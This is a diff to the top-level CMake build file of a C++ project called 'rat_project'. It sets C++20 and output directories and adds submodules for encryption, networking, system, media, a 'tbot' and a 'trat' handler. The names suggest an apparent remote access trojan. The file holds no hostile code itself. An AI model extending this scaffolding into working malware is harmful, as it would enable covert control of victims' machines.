@@ -1,18 +1,35 @@
-cmake_minimum_required(VERSION 3.25)
-project(rat_suite LANGUAGES CXX)
+cmake_minimum_required(VERSION 3.19)
+project(rat_project CXX)
 
-# Choose target
-set(TARGET_PLATFORM "LINUX" CACHE STRING "Target platform: LINUX, LINUX_WIN, WIN")
+set(CMAKE_CXX_STANDARD 20)
+set(CMAKE_CXX_STANDARD_REQUIRED ON)
+set(CMAKE_EXPORT_COMPILE_COMMANDS ON)
 
-if(TARGET_PLATFORM STREQUAL "LINUX")
-    message(STATUS "Including Linux -> Linux CMake")
-    include(CMakeLists-Linux.cmake)
-elseif(TARGET_PLATFORM STREQUAL "LINUX_WIN")
-    message(STATUS "Including Linux -> Windows CMake")
-    include(CMakeLists-Linux_to_Windows.cmake)
-elseif(TARGET_PLATFORM STREQUAL "WIN")
-    message(STATUS "Including Windows -> Windows CMake")
-    include(CMakeLists-NativeWindows.cmake)
-else()
-    message(FATAL_ERROR "Unknown TARGET_PLATFORM=${TARGET_PLATFORM}")
-endif()
+# === Output dirs ===
+set(CMAKE_RUNTIME_OUTPUT_DIRECTORY "${CMAKE_BINARY_DIR}/bin")
+set(CMAKE_ARCHIVE_OUTPUT_DIRECTORY "${CMAKE_BINARY_DIR}/lib")
+
+# === Platform-specific dependencies ===
+include(cmake/LinuxLibs.cmake)
+include(cmake/WindowsLibs.cmake)
+include(cmake/PrecompiledHeadersConfig.cmake)
+# === Submodules ===
+add_subdirectory(rat_encryption)
+add_subdirectory(rat_compression)
+add_subdirectory(rat_threading)
+add_subdirectory(rat_networking)
+add_subdirectory(rat_system)
+add_subdirectory(rat_tbot)
+add_subdirectory(rat_media)
+add_subdirectory(rat_handler)
+add_subdirectory(rat_trat)
+
+foreach(tgt IN ITEMS
+    rat_encryption rat_compression rat_threading
+    rat_networking rat_system rat_tbot
+    rat_media rat_handler rat_trat
+)
+    if(TARGET ${tgt})
+        target_link_libraries(${tgt} PRIVATE rat_precompiled_headers)
+    endif()
+endforeach()
